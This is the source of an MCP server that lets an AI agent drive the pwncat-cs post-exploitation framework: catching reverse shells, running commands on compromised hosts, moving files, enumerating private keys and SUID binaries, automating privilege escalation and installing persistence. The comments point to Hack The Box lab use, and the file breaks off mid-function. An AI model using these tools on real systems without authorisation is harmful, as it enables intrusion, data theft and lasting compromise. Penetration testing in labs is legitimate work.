#!/usr/bin/env python3
"""
Agent Opulence - Pwncat MCP Server
==================================
MCP interface for pwncat-cs post-exploitation framework.

Protocol: FastMCP over stdio
"""

import os
import sys
import json
import asyncio
import logging
import uuid
from typing import Dict, List, Any, Optional
from datetime import datetime, timezone
from pathlib import Path
from enum import Enum

from pydantic import BaseModel, Field, ConfigDict, field_validator
from mcp.server.fastmcp import FastMCP

logging.basicConfig(level=logging.INFO, stream=sys.stderr)
logger = logging.getLogger('pwncat-mcp')

# Initialize FastMCP server
mcp = FastMCP("pwncat_mcp")

# Pwncat availability flag - set during initialize()
PWNCAT_AVAILABLE = False


# =============================================================================
# Response Format Enum and Helpers
# =============================================================================

class ResponseFormat(str, Enum):
    """Output format for tool responses."""
    JSON = "json"
    MARKDOWN = "markdown"


def _time_ago(iso_timestamp: str) -> str:
    """Convert ISO timestamp to human-readable time ago string."""
    try:
        dt = datetime.fromisoformat(iso_timestamp.replace('Z', '+00:00'))
        now = datetime.now(timezone.utc)
        diff = now - dt

        if diff.total_seconds() < 60:
            return f"{int(diff.total_seconds())} sec ago"
        elif diff.total_seconds() < 3600:
            return f"{int(diff.total_seconds() / 60)} min ago"
        elif diff.total_seconds() < 86400:
            return f"{int(diff.total_seconds() / 3600)} hr ago"
        else:
            return f"{int(diff.total_seconds() / 86400)} days ago"
    except Exception:
        return iso_timestamp


def _format_sessions_markdown(sessions: List[Dict[str, Any]]) -> str:
    """Format session list as markdown."""
    if not sessions:
        return "## Active Sessions (0)\n\nNo active sessions."

    lines = [
        f"## Active Sessions ({len(sessions)})",
        "",
        "| ID | User | Host | Platform | Connected |",
        "|----|------|------|----------|-----------|"
    ]

    for sess in sessions:
        session_id = f"`{sess.get('session_id', '?')}`"
        user = sess.get('user', 'unknown')
        hostname = sess.get('hostname', 'unknown')
        platform = sess.get('platform', 'unknown')
        connected = _time_ago(sess.get('connected_at', ''))
        lines.append(f"| {session_id} | {user} | {hostname} | {platform} | {connected} |")

    return "\n".join(lines)


def _format_enumeration_markdown(result: Dict[str, Any]) -> str:
    """Format enumeration results as markdown."""
    lines = [
        f"## Enumeration Results",
        "",
        f"**Session:** `{result.get('session_id', '?')}`",
        f"**Executed:** {_time_ago(result.get('executed_at', ''))}",
        "",
        "### Summary",
        f"- Total modules: {result.get('summary', {}).get('total_modules', 0)}",
        f"- Successful: {result.get('summary', {}).get('successful', 0)}",
        f"- Failed: {result.get('summary', {}).get('failed', 0)}",
        f"- Timed out: {result.get('summary', {}).get('timed_out', 0)}",
        ""
    ]

    categories = result.get('categories', {})
    for category, data in categories.items():
        lines.append(f"### {category.title()}")
        lines.append("")

        modules = data.get('modules', {})
        for module_name, module_data in modules.items():
            status = module_data.get('status', 'unknown')
            status_icon = "+" if status == "success" else "-" if status == "error" else "~"
            lines.append(f"**{status_icon} {module_name}** ({status})")

            if status == "success" and module_data.get('results'):
                for r in module_data['results'][:5]:  # Limit to 5 results
                    lines.append(f"  - {r}")
                if len(module_data['results']) > 5:
                    lines.append(f"  - ... and {len(module_data['results']) - 5} more")
            elif module_data.get('error'):
                lines.append(f"  - Error: {module_data['error']}")
            lines.append("")

    return "\n".join(lines)


def _format_privesc_suggestions_markdown(result: Dict[str, Any]) -> str:
    """Format privilege escalation suggestions as markdown."""
    lines = [
        "## Privilege Escalation Suggestions",
        "",
        f"**Session:** `{result.get('session_id', '?')}`",
        f"**Current User:** {result.get('current_user', 'unknown')}",
        f"**Target User:** {result.get('target_user', 'root')}",
        ""
    ]

    suggestions = result.get('suggestions', [])
    if not suggestions:
        lines.append("No escalation vectors found.")
        return "\n".join(lines)

    lines.append(f"Found **{len(suggestions)}** potential vectors:")
    lines.append("")
    lines.append("| Priority | Technique | Type | Target | Automated |")
    lines.append("|----------|-----------|------|--------|-----------|")

    for sug in suggestions:
        priority = sug.get('priority', 99)
        technique = sug.get('technique', 'unknown')[:30]
        esc_type = sug.get('type', 'unknown')
        target = sug.get('target_user', 'root')
        automated = "Yes" if sug.get('automated') else "No"
        lines.append(f"| {priority} | `{technique}` | {esc_type} | {target} | {automated} |")

    return "\n".join(lines)


def _format_persist_list_markdown(result: Dict[str, Any]) -> str:
    """Format persistence methods list as markdown."""
    lines = [
        "## Available Persistence Methods",
        "",
        f"**Session:** `{result.get('session_id', '?')}`",
        f"**Platform:** {result.get('platform', 'unknown')}",
        f"**Current User:** {result.get('current_user', 'unknown')}",
        ""
    ]

    methods = result.get('methods', [])
    if not methods:
        lines.append("No persistence methods available.")
        return "\n".join(lines)

    lines.append("| Method | Description | Requires Root |")
    lines.append("|--------|-------------|---------------|")

    for method in methods:
        name = method.get('method', 'unknown')
        desc = method.get('description', '')[:40]
        requires_root = "Yes" if method.get('requires_root') else "No"
        lines.append(f"| `{name}` | {desc} | {requires_root} |")

    return "\n".join(lines)


# =============================================================================
# Pydantic Input Models
# =============================================================================

class ListenInput(BaseModel):
    """Input model for pwncat_listen tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    port: int = Field(
        ...,
        description="Port to listen on for incoming connections (1-65535)",
        ge=1,
        le=65535
    )
    host: str = Field(
        default="0.0.0.0",
        description="Host/interface to bind to (default: 0.0.0.0)"
    )
    timeout: Optional[float] = Field(
        default=None,
        description="Maximum seconds to wait for connection (optional, omit to wait indefinitely)",
        ge=1
    )


class ConnectInput(BaseModel):
    """Input model for pwncat_connect tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    host: str = Field(
        ...,
        description="Target host/IP address",
        min_length=1
    )
    port: int = Field(
        ...,
        description="Target port (1-65535)",
        ge=1,
        le=65535
    )
    platform: str = Field(
        default="linux",
        description="Target platform (linux or windows)"
    )

    @field_validator('platform')
    @classmethod
    def validate_platform(cls, v: str) -> str:
        allowed = ['linux', 'windows']
        if v.lower() not in allowed:
            raise ValueError(f"Platform must be one of: {', '.join(allowed)}")
        return v.lower()


class CommandInput(BaseModel):
    """Input model for pwncat_command tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session identifier (8-character hex string)",
        min_length=1
    )
    command: str = Field(
        ...,
        description="Shell command to execute",
        min_length=1
    )


class ModuleInput(BaseModel):
    """Input model for pwncat_module tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session identifier (8-character hex string)",
        min_length=1
    )
    module: str = Field(
        ...,
        description="Module name (e.g., enumerate.system.uname, escalate.auto)",
        min_length=1
    )
    options: Optional[Dict[str, Any]] = Field(
        default_factory=dict,
        description="Module-specific options as key-value pairs"
    )


class FileTransferInput(BaseModel):
    """Input model for pwncat_upload and pwncat_download tools."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session identifier (8-character hex string)",
        min_length=1
    )
    local_path: str = Field(
        ...,
        description="Path on the local system",
        min_length=1
    )
    remote_path: str = Field(
        ...,
        description="Path on the target system",
        min_length=1
    )


class SessionInput(BaseModel):
    """Input model for pwncat_close tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session identifier to close",
        min_length=1
    )


class GetLhostInput(BaseModel):
    """Input model for pwncat_get_lhost tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    interface: str = Field(
        default="tun0",
        description="Network interface to query (default: tun0 for HTB VPN)"
    )


class SessionsListInput(BaseModel):
    """Input model for pwncat_sessions tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    response_format: ResponseFormat = Field(
        default=ResponseFormat.JSON,
        description="Output format: 'json' for structured data, 'markdown' for human-readable"
    )


class EnumerationCategory(str, Enum):
    """Valid enumeration categories for bulk enumeration."""
    SYSTEM = "system"
    USER = "user"
    NETWORK = "network"
    FILE = "file"
    SOFTWARE = "software"


class EnumerateAllInput(BaseModel):
    """Input model for pwncat_enumerate_all tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session identifier (8-character hex string)",
        min_length=1
    )
    categories: List[EnumerationCategory] = Field(
        default=[EnumerationCategory.SYSTEM, EnumerationCategory.USER,
                 EnumerationCategory.NETWORK],
        description="Categories to enumerate: system, user, network, file, software"
    )
    timeout_per_module: float = Field(
        default=30.0,
        description="Timeout in seconds for each enumeration module",
        ge=5.0,
        le=300.0
    )
    response_format: ResponseFormat = Field(
        default=ResponseFormat.JSON,
        description="Output format: 'json' for structured data, 'markdown' for human-readable"
    )


class PrivescSuggestInput(BaseModel):
    """Input model for pwncat_privesc_suggest tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session identifier (8-character hex string)",
        min_length=1
    )
    run_enumeration: bool = Field(
        default=True,
        description="Run enumeration modules first to gather info (recommended)"
    )
    response_format: ResponseFormat = Field(
        default=ResponseFormat.JSON,
        description="Output format: 'json' for structured data, 'markdown' for human-readable"
    )


class PrivescAutoInput(BaseModel):
    """Input model for pwncat_privesc_auto tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session identifier (8-character hex string)",
        min_length=1
    )
    techniques: Optional[List[str]] = Field(
        default=None,
        description="Specific escalation techniques to try (None = all available)"
    )
    stop_on_success: bool = Field(
        default=True,
        description="Stop after first successful escalation"
    )


class PersistListInput(BaseModel):
    """Input model for pwncat_persist_list tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session identifier (8-character hex string)",
        min_length=1
    )
    response_format: ResponseFormat = Field(
        default=ResponseFormat.JSON,
        description="Output format: 'json' for structured data, 'markdown' for human-readable"
    )


class PersistInstallInput(BaseModel):
    """Input model for pwncat_persist_install tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session identifier (8-character hex string)",
        min_length=1
    )
    method: str = Field(
        ...,
        description="Persistence method (e.g., passwd_user, ssh_authorized_keys, cron, systemd)",
        min_length=1
    )
    options: Optional[Dict[str, Any]] = Field(
        default_factory=dict,
        description="Method-specific options (e.g., username, ssh_key, command)"
    )


# =============================================================================
# PwncatClient Class (unchanged from original)
# =============================================================================

class PwncatClient:
    """Pwncat-cs client wrapper using direct Python import.

    Design Decision (blunderbussy-1ax): Use direct import of pwncat.manager.Manager
    - Simplest integration, no IPC overhead
    - Matches pwncat's intended usage pattern
    - Manager class handles sessions internally

    All blocking pwncat operations are wrapped with asyncio.to_thread()
    to prevent blocking the async event loop.
    """

    def __init__(self):
        """Initialize the PwncatClient.

        Manager is lazily initialized via initialize() to handle
        the case where pwncat-cs is not installed.
        """
        self.manager = None  # Will be pwncat.manager.Manager instance
        self.sessions: Dict[str, Any] = {}  # session_id -> session metadata
        self._pwncat_sessions: Dict[str, Any] = {}  # session_id -> actual pwncat session
        self._listeners: Dict[int, Any] = {}  # port -> listener info
        self._initialized = False  # True if pwncat successfully loaded
        self._init_attempted = False  # True if initialization was attempted (even if failed)
        self._init_error: Optional[str] = None  # Error message if initialization failed

    async def initialize(self) -> bool:
        """Initialize pwncat manager.

        Imports pwncat.manager.Manager and creates an instance.
        Handles ImportError gracefully if pwncat-cs is not installed.

        Returns:
            True on success, False if pwncat is not available
        """
        global PWNCAT_AVAILABLE

        # Already successfully initialized
        if self._initialized:
            return True

        # Already attempted and failed - don't retry
        if self._init_attempted:
            return False

        self._init_attempted = True

        try:
            # Attempt to import pwncat - this is a blocking operation
            def _init_manager():
                from pwncat.manager import Manager
                return Manager()

            self.manager = await asyncio.to_thread(_init_manager)
            self._initialized = True
            PWNCAT_AVAILABLE = True
            logger.info("Pwncat manager initialized successfully (direct import)")
            return True

        except ImportError as e:
            self._init_error = f"pwncat-cs not installed: {e}"
            logger.warning(self._init_error)
            logger.warning("Pwncat functionality will be unavailable")
            PWNCAT_AVAILABLE = False
            return False

        except Exception as e:
            self._init_error = f"Failed to initialize pwncat manager: {e}"
            logger.error(self._init_error)
            PWNCAT_AVAILABLE = False
            return False

    def _generate_session_id(self) -> str:
        """Generate a unique session ID."""
        return str(uuid.uuid4())[:8]

    def _get_session_metadata(self, session_id: str, pwncat_session: Any) -> Dict[str, Any]:
        """Extract metadata from a pwncat session object.

        Args:
            session_id: Our internal session identifier
            pwncat_session: The actual pwncat Session object

        Returns:
            Dict containing session metadata
        """
        try:
            # Get platform info
            platform_name = getattr(pwncat_session.platform, 'name', 'unknown')

            # Try to get hostname
            hostname = 'unknown'
            try:
                hostname = pwncat_session.platform.hostname
            except Exception:
                pass

            # Try to get current user
            user = 'unknown'
            try:
                current_user = pwncat_session.current_user()
                user = getattr(current_user, 'name', str(current_user))
            except Exception:
                pass

            return {
                "session_id": session_id,
                "platform": platform_name,
                "hostname": hostname,
                "user": user,
                "connected_at": datetime.now(timezone.utc).isoformat()
            }
        except Exception as e:
            logger.error(f"Error extracting session metadata: {e}")
            return {
                "session_id": session_id,
                "platform": "unknown",
                "hostname": "unknown",
                "user": "unknown",
                "connected_at": datetime.now(timezone.utc).isoformat()
            }

    async def listen(self, port: int, host: str = "0.0.0.0",
                     timeout: Optional[float] = None) -> Dict[str, Any]:
        """Start a listener for reverse shells.

        Creates a background listener that waits for incoming connections.
        When a connection is received, a session is automatically created.

        Args:
            port: Port to listen on
            host: Host/interface to bind to (default: 0.0.0.0)
            timeout: Maximum seconds to wait for connection (None = wait forever)

        Returns:
            Dict containing session info when a connection is received

        Raises:
            TimeoutError: If no connection received within timeout
            RuntimeError: If client not initialized or manager unavailable
        """
        if not self._initialized:
            error_msg = self._init_error or "PwncatClient not initialized. Call initialize() first."
            raise RuntimeError(error_msg)

        if self.manager is None:
            raise RuntimeError("Pwncat manager not available")

        logger.info(f"Starting listener on {host}:{port}" +
                   (f" (timeout: {timeout}s)" if timeout else ""))

        session_id = self._generate_session_id()
        session_received = asyncio.Event()
        session_result: Dict[str, Any] = {}
        loop = asyncio.get_running_loop()
        listener = None

        def _cleanup_listener():
            """Clean up listener on failure or timeout."""
            if port in self._listeners:
                listener_info = self._listeners.pop(port)
                try:
                    if hasattr(listener_info.get("listener"), "stop"):
                        listener_info["listener"].stop()
                except Exception as cleanup_err:
                    logger.warning(f"Error cleaning up listener: {cleanup_err}")

        try:
            def _create_listener():
                """Create listener in thread - blocking operation."""
                def on_session(session):
                    """Callback when session is established."""
                    nonlocal session_result
                    self._pwncat_sessions[session_id] = session
                    metadata = self._get_session_metadata(session_id, session)
                    self.sessions[session_id] = metadata
                    session_result.update(metadata)
                    # Thread-safe event signaling
                    loop.call_soon_threadsafe(session_received.set)
                    return True  # Keep the session

                # Use manager.create_listener for background listening
                return self.manager.create_listener(
                    protocol="socket",
                    host=host,
                    port=port,
                    platform="linux",
                    established=on_session
                )

            # Start the listener in a thread
            listener = await asyncio.to_thread(_create_listener)
            self._listeners[port] = {
                "listener": listener,
                "host": host,
                "port": port,
                "started_at": datetime.now(timezone.utc).isoformat()
            }

            logger.info(f"Listener started on {host}:{port}, waiting for connection...")

            # Wait for a session to be established (with optional timeout)
            try:
                await asyncio.wait_for(session_received.wait(), timeout=timeout)
            except asyncio.TimeoutError:
                _cleanup_listener()
                raise TimeoutError(
                    f"No connection received on {host}:{port} within {timeout}s"
                )

            logger.info(f"Session {session_id} established from listener on port {port}")
            return session_result

        except TimeoutError:
            raise  # Re-raise timeout errors as-is
        except Exception as e:
            logger.error(f"Failed to create listener on {host}:{port}: {e}")
            _cleanup_listener()
            raise

    async def connect(self, host: str, port: int, platform: str = "linux") -> Dict[str, Any]:
        """Connect to a bind shell.

        Actively connects to a target running a bind shell.

        Args:
            host: Target host/IP address
            port: Target port
            platform: Target platform (default: linux)

        Returns:
            Dict containing session info
        """
        if not self._initialized:
            error_msg = self._init_error or "PwncatClient not initialized. Call initialize() first."
            raise RuntimeError(error_msg)

        if self.manager is None:
            raise RuntimeError("Pwncat manager not available")

        logger.info(f"Connecting to bind shell at {host}:{port}")

        try:
            def _connect():
                """Connect to bind shell - blocking operation."""
                # Use manager.create_session with connect protocol
                session = self.manager.create_session(
                    platform=platform,
                    protocol="connect",
                    host=host,
                    port=port
                )
                return session

            pwncat_session = await asyncio.to_thread(_connect)

            session_id = self._generate_session_id()
            self._pwncat_sessions[session_id] = pwncat_session
            metadata = self._get_session_metadata(session_id, pwncat_session)
            self.sessions[session_id] = metadata

            logger.info(f"Session {session_id} established to {host}:{port}")
            return metadata

        except Exception as e:
            logger.error(f"Failed to connect to {host}:{port}: {e}")
            raise

    async def list_sessions(self) -> List[Dict[str, Any]]:
        """List active pwncat sessions.

        Returns:
            List of session metadata dicts containing:
            - session_id: Unique identifier
            - platform: Target OS (linux, windows, etc.)
            - hostname: Target hostname
            - user: Current user on target
            - connected_at: ISO timestamp of connection
        """
        # Update session info from manager if available
        if self.manager is not None:
            try:
                def _refresh_sessions() -> List[str]:
                    """Refresh session list, return IDs of dead sessions."""
                    dead_sessions = []
                    for session_id, pwncat_session in self._pwncat_sessions.items():
                        try:
                            # Check if session is still alive
                            if pwncat_session.channel is None or not pwncat_session.channel.connected:
                                dead_sessions.append(session_id)
                        except Exception:
                            pass
                    return dead_sessions

                dead_sessions = await asyncio.to_thread(_refresh_sessions)
                # Remove dead sessions after iteration completes
                for session_id in dead_sessions:
                    self._pwncat_sessions.pop(session_id, None)
                    self.sessions.pop(session_id, None)
            except Exception as e:
                logger.warning(f"Error refreshing sessions: {e}")

        return list(self.sessions.values())

    async def run_command(self, session_id: str, command: str) -> Dict[str, Any]:
        """Execute shell command in a session.

        Args:
            session_id: Session identifier
            command: Shell command to execute

        Returns:
            Dict containing:
            - command: The executed command
            - output: Command output (stdout + stderr)
            - exit_code: Command exit code
            - executed_at: ISO timestamp
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        pwncat_session = self._pwncat_sessions[session_id]
        logger.info(f"Session {session_id}: executing '{command}'")

        try:
            def _run_command():
                """Execute command - blocking operation."""
                # pwncat platform.run() executes commands
                # Returns a tuple of (stdout, stderr) or just output depending on method
                try:
                    # Try platform.run() first - common pwncat pattern
                    result = pwncat_session.platform.run(
                        command,
                        shell=True,
                        capture_output=True
                    )
                    if hasattr(result, 'stdout'):
                        output = result.stdout.decode() if isinstance(result.stdout, bytes) else result.stdout
                        exit_code = result.returncode if hasattr(result, 'returncode') else 0
                    else:
                        output = result.decode() if isinstance(result, bytes) else str(result)
                        exit_code = 0
                    return output, exit_code
                except AttributeError:
                    # Fallback: try direct channel interaction
                    pwncat_session.channel.sendline(command.encode())
                    output = pwncat_session.channel.recvuntil(b'\n', timeout=30)
                    return output.decode(), 0

            output, exit_code = await asyncio.to_thread(_run_command)

            return {
                "command": command,
                "output": output,
                "exit_code": exit_code,
                "executed_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Command execution failed in session {session_id}: {e}")
            return {
                "command": command,
                "output": f"Error: {str(e)}",
                "exit_code": -1,
                "executed_at": datetime.now(timezone.utc).isoformat()
            }

    async def run_module(self, session_id: str, module: str, **options) -> Dict[str, Any]:
        """Run a pwncat module in a session.

        Modules include:
        - enumerate.* - Enumeration modules (enumerate.system, enumerate.user, etc.)
        - escalate.* - Privilege escalation modules
        - persist.* - Persistence modules

        Args:
            session_id: Session identifier
            module: Module name (e.g., 'enumerate.system.uname')
            **options: Module-specific options

        Returns:
            Dict containing module results
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        pwncat_session = self._pwncat_sessions[session_id]
        logger.info(f"Session {session_id}: running module '{module}' with options {options}")

        try:
            def _run_module():
                """Execute module - blocking operation."""
                # session.run() executes pwncat modules
                result = pwncat_session.run(module, **options)
                # Result is typically a generator of facts/results
                results = []
                if hasattr(result, '__iter__'):
                    for item in result:
                        if hasattr(item, '__dict__'):
                            results.append(str(item))
                        else:
                            results.append(item)
                else:
                    results = [str(result)]
                return results

            results = await asyncio.to_thread(_run_module)

            return {
                "session_id": session_id,
                "module": module,
                "options": options,
                "results": results,
                "status": "success",
                "executed_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Module execution failed in session {session_id}: {e}")
            return {
                "session_id": session_id,
                "module": module,
                "options": options,
                "results": [],
                "status": "error",
                "error": str(e),
                "executed_at": datetime.now(timezone.utc).isoformat()
            }

    async def upload(self, session_id: str, local_path: str, remote_path: str) -> Dict[str, Any]:
        """Upload a file to the target.

        Args:
            session_id: Session identifier
            local_path: Path to local file
            remote_path: Destination path on target

        Returns:
            Dict containing:
            - success: Boolean indicating success
            - bytes_transferred: Number of bytes transferred
            - remote_path: Final remote path
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        local_file = Path(local_path)
        if not local_file.exists():
            raise FileNotFoundError(f"Local file not found: {local_path}")

        pwncat_session = self._pwncat_sessions[session_id]
        logger.info(f"Session {session_id}: uploading {local_path} -> {remote_path}")

        try:
            def _upload_file():
                """Upload file - blocking operation."""
                with open(local_path, 'rb') as f:
                    data = f.read()

                # Use platform's file writing capability
                # pwncat provides platform.Path for file operations
                remote = pwncat_session.platform.Path(remote_path)
                remote.write_bytes(data)
                return len(data)

            bytes_transferred = await asyncio.to_thread(_upload_file)

            logger.info(f"Upload complete: {bytes_transferred} bytes to {remote_path}")
            return {
                "success": True,
                "bytes_transferred": bytes_transferred,
                "remote_path": remote_path,
                "local_path": local_path
            }

        except Exception as e:
            logger.error(f"Upload failed in session {session_id}: {e}")
            return {
                "success": False,
                "bytes_transferred": 0,
                "remote_path": remote_path,
                "local_path": local_path,
                "error": str(e)
            }

    async def download(self, session_id: str, remote_path: str, local_path: str) -> Dict[str, Any]:
        """Download a file from the target.

        Args:
            session_id: Session identifier
            remote_path: Path to file on target
            local_path: Destination path locally

        Returns:
            Dict containing:
            - success: Boolean indicating success
            - bytes_transferred: Number of bytes transferred
            - local_path: Final local path
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        pwncat_session = self._pwncat_sessions[session_id]
        logger.info(f"Session {session_id}: downloading {remote_path} -> {local_path}")

        try:
            def _download_file():
                """Download file - blocking operation."""
                # Use platform's file reading capability
                remote = pwncat_session.platform.Path(remote_path)
                data = remote.read_bytes()

                # Ensure local directory exists
                local_file = Path(local_path)
                local_file.parent.mkdir(parents=True, exist_ok=True)

                with open(local_path, 'wb') as f:
                    f.write(data)
                return len(data)

            bytes_transferred = await asyncio.to_thread(_download_file)

            logger.info(f"Download complete: {bytes_transferred} bytes to {local_path}")
            return {
                "success": True,
                "bytes_transferred": bytes_transferred,
                "local_path": local_path,
                "remote_path": remote_path
            }

        except Exception as e:
            logger.error(f"Download failed in session {session_id}: {e}")
            return {
                "success": False,
                "bytes_transferred": 0,
                "local_path": local_path,
                "remote_path": remote_path,
                "error": str(e)
            }

    async def close_session(self, session_id: str) -> Dict[str, Any]:
        """Terminate a session.

        Args:
            session_id: Session identifier to close

        Returns:
            Dict confirming closure
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        pwncat_session = self._pwncat_sessions[session_id]
        logger.info(f"Closing session {session_id}")

        try:
            def _close_session():
                """Close session - blocking operation."""
                pwncat_session.close()

            await asyncio.to_thread(_close_session)

            # Remove from our tracking
            del self._pwncat_sessions[session_id]
            session_info = self.sessions.pop(session_id, {})

            logger.info(f"Session {session_id} closed successfully")
            return {
                "session_id": session_id,
                "status": "closed",
                "closed_at": datetime.now(timezone.utc).isoformat(),
                "previous_info": session_info
            }

        except Exception as e:
            logger.error(f"Failed to close session {session_id}: {e}")
            # Still try to remove from tracking
            self._pwncat_sessions.pop(session_id, None)
            self.sessions.pop(session_id, None)
            return {
                "session_id": session_id,
                "status": "error",
                "error": str(e),
                "closed_at": datetime.now(timezone.utc).isoformat()
            }

    async def get_lhost(self, interface: str = "tun0") -> Dict[str, Any]:
        """Get the VPN IP address for reverse shell callbacks.

        Since pwncat-mcp shares gluetun's network namespace, this returns
        the VPN tunnel IP that HTB targets can reach for reverse shells.

        Args:
            interface: Network interface to query (default: tun0 for VPN)

        Returns:
            Dict containing:
            - lhost: The IP address to use in reverse shell payloads
            - interface: The interface queried
            - error: Error message if IP couldn't be determined
        """
        import socket
        import fcntl
        import struct

        def _get_interface_ip(ifname: str) -> Optional[str]:
            """Get IP address of a network interface using ioctl."""
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # SIOCGIFADDR = 0x8915
                result = fcntl.ioctl(
                    s.fileno(),
                    0x8915,
                    struct.pack('256s', ifname[:15].encode('utf-8'))
                )
                ip = socket.inet_ntoa(result[20:24])
                s.close()
                return ip
            except OSError:
                return None

        try:
            ip = await asyncio.to_thread(_get_interface_ip, interface)

            if ip:
                logger.info(f"LHOST discovered: {ip} on {interface}")
                return {
                    "lhost": ip,
                    "interface": interface
                }
            else:
                return {
                    "error": f"Interface {interface} not found or has no IPv4 address",
                    "interface": interface
                }

        except Exception as e:
            logger.error(f"Failed to get LHOST: {e}")
            return {
                "error": str(e),
                "interface": interface
            }

    async def enumerate_all(
        self,
        session_id: str,
        categories: List[EnumerationCategory],
        timeout_per_module: float = 30.0
    ) -> Dict[str, Any]:
        """Run bulk enumeration across multiple categories.

        Executes appropriate enumerate.* modules for each requested category
        and aggregates results.

        Args:
            session_id: Session identifier
            categories: List of categories (system, user, network, file, software)
            timeout_per_module: Timeout in seconds for each module

        Returns:
            Dict containing aggregated results grouped by category
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        pwncat_session = self._pwncat_sessions[session_id]

        # Map categories to pwncat enumerate modules
        category_modules = {
            "system": [
                "enumerate.system.uname",
                "enumerate.system.hostname",
                "enumerate.system.environment",
                "enumerate.system.init",
                "enumerate.system.selinux",
            ],
            "user": [
                "enumerate.user",
                "enumerate.user.privkey",
                "enumerate.user.group",
            ],
            "network": [
                "enumerate.network.hosts",
                "enumerate.network.interfaces",
                "enumerate.network.services",
            ],
            "file": [
                "enumerate.file.suid",
                "enumerate.file.caps",
                "enumerate.file.writable",
            ],
            "software": [
                "enumerate.software.screen",
                "enumerate.software.sudo",
                "enumerate.software.cron",
            ],
        }

        results: Dict[str, Any] = {
            "session_id": session_id,
            "categories": {},
            "summary": {
                "total_modules": 0,
                "successful": 0,
                "failed": 0,
                "timed_out": 0
            },
            "executed_at": datetime.now(timezone.utc).isoformat()
        }

        for category in categories:
            category_key = category.value if hasattr(category, 'value') else category
            if category_key not in category_modules:
                logger.warning(f"Unknown category: {category_key}")
                continue

            results["categories"][category_key] = {
                "modules": {},
                "status": "success"
            }

            for module in category_modules[category_key]:
                results["summary"]["total_modules"] += 1

                try:
                    def _run_module_with_timeout():
                        """Execute module - blocking operation."""
                        module_results = []
                        try:
                            result = pwncat_session.run(module)
                            if hasattr(result, '__iter__'):
                                for item in result:
                                    if hasattr(item, '__dict__'):
                                        module_results.append(str(item))
                                    else:
                                        module_results.append(item)
                            else:
                                module_results = [str(result)]
                        except Exception as e:
                            raise e
                        return module_results

                    # Run with timeout
                    module_result = await asyncio.wait_for(
                        asyncio.to_thread(_run_module_with_timeout),
                        timeout=timeout_per_module
                    )

                    results["categories"][category_key]["modules"][module] = {
                        "status": "success",
                        "results": module_result
                    }
                    results["summary"]["successful"] += 1

                except asyncio.TimeoutError:
                    logger.warning(f"Module {module} timed out after {timeout_per_module}s")
                    results["categories"][category_key]["modules"][module] = {
                        "status": "timeout",
                        "error": f"Timed out after {timeout_per_module}s"
                    }
                    results["summary"]["timed_out"] += 1

                except Exception as e:
                    logger.error(f"Module {module} failed: {e}")
                    results["categories"][category_key]["modules"][module] = {
                        "status": "error",
                        "error": str(e)
                    }
                    results["summary"]["failed"] += 1

        return results

    async def privesc_suggest(
        self,
        session_id: str,
        run_enumeration: bool = True
    ) -> Dict[str, Any]:
        """Get privilege escalation suggestions based on session state.

        Analyzes the current session for potential privilege escalation vectors
        and returns prioritized suggestions.

        Args:
            session_id: Session identifier
            run_enumeration: Whether to run enumeration first

        Returns:
            Dict containing prioritized escalation suggestions
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        pwncat_session = self._pwncat_sessions[session_id]

        results: Dict[str, Any] = {
            "session_id": session_id,
            "suggestions": [],
            "enumeration_run": run_enumeration,
            "current_user": "unknown",
            "target_user": "root",
            "executed_at": datetime.now(timezone.utc).isoformat()
        }

        try:
            # Get current user
            try:
                current_user = pwncat_session.current_user()
                results["current_user"] = getattr(current_user, 'name', str(current_user))
            except Exception:
                pass

            # Run enumeration if requested to populate facts
            if run_enumeration:
                enum_modules = [
                    "enumerate.file.suid",
                    "enumerate.software.sudo",
                    "enumerate.file.caps",
                    "enumerate.software.cron",
                ]
                for module in enum_modules:
                    try:
                        await asyncio.wait_for(
                            asyncio.to_thread(lambda m=module: list(pwncat_session.run(m))),
                            timeout=15.0
                        )
                    except Exception:
                        pass

            # Get escalation suggestions
            def _get_escalations():
                """Get available escalation methods."""
                escalations = []
                try:
                    # List available escalation modules/techniques
                    result = pwncat_session.run("escalate.list")
                    if hasattr(result, '__iter__'):
                        for item in result:
                            escalations.append({
